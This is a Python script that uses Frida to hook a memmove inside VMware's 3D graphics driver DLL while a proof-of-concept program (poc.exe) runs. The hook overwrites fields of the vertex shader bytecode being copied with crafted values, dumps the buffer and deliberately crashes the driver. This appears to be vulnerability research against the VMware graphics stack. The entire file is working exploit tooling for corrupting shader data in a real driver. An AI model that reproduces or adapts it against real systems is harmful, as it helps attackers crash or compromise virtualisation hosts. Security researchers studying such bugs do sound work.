import frida
import subprocess
import os
import sys
import signal
import time

def on_message(message, data):
    global tpid
    if message["type"] == "send":
        print("log: " + message["payload"])
        if "done" in message["payload"]:
            print("we are done with " + str(tpid))
            time.sleep(1)
            os.kill(tpid, signal.SIGTERM)
            os.kill(os.getpid(), signal.SIGTERM) # frida otherwise intercepts sys.exit

def getpid(process_name):
    import os
    return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

base_script = """
    var vm3d_base = Module.findBaseAddress("vm3dum64_10.dll");
    console.log("base address: " + vm3d_base);
    
    function ida2win(addr) {
        var idaBase = ptr('0x180000000');
        var off = ptr(addr).sub(idaBase);
        var res = vm3d_base.add(off);
        console.log("translated " + ptr(addr) + " -> " + res);
        return res;
    }
    
    function win2ida(addr) {
        console.log(vm3d_base);
        var off = ptr(add).sub(vm3d_base);
        var ida = ptr('0x180000000').add(off);
        console.log("translated " + ptr(addr) + " -> " + ida);
        return ida;
    }

    function start() {
        var memmove_addr = ida2win(0x18002B1A0);
        var setShader_vs_return = ida2win(0x180019891);
        var setShader_ps_return = ida2win(0x180019751);
    
        Interceptor.attach(memmove_addr, {
            onLeave : function (retval) {
                if (!this.hit) {
                    return;
                }

                Memory.writeU8(this.dest_addr.add(0x14), 0x69);
                Memory.writeU32(this.dest_addr.add(0x14+4), 0xffffffff);
                Memory.writeU32(this.dest_addr.add(0x14+8), 0x41414141);
                console.log("dest on leave");
                var buf = Memory.readByteArray(this.dest_addr, this.len);
                console.log(hexdump(buf, {
                    ansi: false,
                    length : this.len,
                    header : true,
                    offset : 0
                }));
                send("done");
            },
            onEnter : function (args) {
                var shaderType = Memory.readU8(args[1].add(2));
                if (!this.returnAddress.compare(setShader_vs_return)) {
                    // we only care for messing with the vertex shader here
                    this.hit = 1;
                    send("SetShader memmove(" + args[0] + ", " + args[1] + ", " + args[2] + ")");
                    this.dest_addr = args[0];
                    this.src_addr = args[1];
                    this.len = args[2].toInt32();
                    var buf = Memory.readByteArray(this.src_addr, this.len);
                    console.log(hexdump(buf, {
                        ansi: false,
                        length : this.len,
                        header : true,
                        offset : 0
                    }));
                } else {
                    this.hit = 0;
                }
            }
        });
    }
    start();
    console.log("start");
"""

def start_process(f = None):
    global tpid

    print("launching poc.exe")
    subprocess.Popen([os.getcwd() + '\poc.exe'])
    pids = getpid("poc.exe")
    if len(pids) > 1:
        print("something is odd here, more than one process")
        sys.exit(1)
    if len(pids) == 0:
        print("not running")
        sys.exit(2)
    
    tpid = int(pids[0])
    print("process is %d" %(tpid))
    print("attaching Frida to mess with shader bytecode")
    print("poc waits a few seconds, before we inject our payload and crash...")
    session = frida.attach(tpid)
    
    scriptc = base_script
    script = session.create_script(scriptc)
    
    script.on('message', on_message)
    script.load()
    
    sys.stdin.read()

start_process()

